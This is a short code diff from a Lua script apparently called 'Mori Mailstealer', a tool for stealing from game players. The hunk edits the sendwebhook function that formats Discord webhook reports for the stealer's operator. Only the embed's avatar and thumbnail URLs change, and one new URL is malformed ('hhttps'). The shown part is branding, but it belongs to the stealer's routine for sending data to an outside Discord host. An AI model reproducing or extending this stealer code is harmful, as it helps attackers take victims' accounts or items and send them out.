@@ -31,7 +31,7 @@ local webhookcolor = "13369599"
 
 local function sendwebhook(msg)
 local msg = {
-	["avatar_url"] = "https://cdn.discordapp.com/icons/1085872367831613471/a_55aaf60df3ca5b6ba8c7fc5401f3a1ba.gif?size=4096",
+	["avatar_url"] = "hhttps://cdn.discordapp.com/icons/1107691261164527710/d8f2f292e0e5012ae9b66d8091509a2d.png?size=4096",
 	["content"]= "**Mori**",
 	["username"] = "Mori Mailstealer",
 	["embeds"]= {
@@ -41,7 +41,7 @@ local msg = {
 		["url"]= "https://discord.gg/YaM9ESyVQv",
 		["color"]= ""..webhookcolor.."",
 		["thumbnail"] = {
-        ["url"] = "https://cdn.discordapp.com/icons/1085872367831613471/a_55aaf60df3ca5b6ba8c7fc5401f3a1ba.gif?size=4096",
+        ["url"] = "https://cdn.discordapp.com/icons/1107691261164527710/d8f2f292e0e5012ae9b66d8091509a2d.png?size=4096",
         ["height"] = 420,
         ["width"] = 420
         },
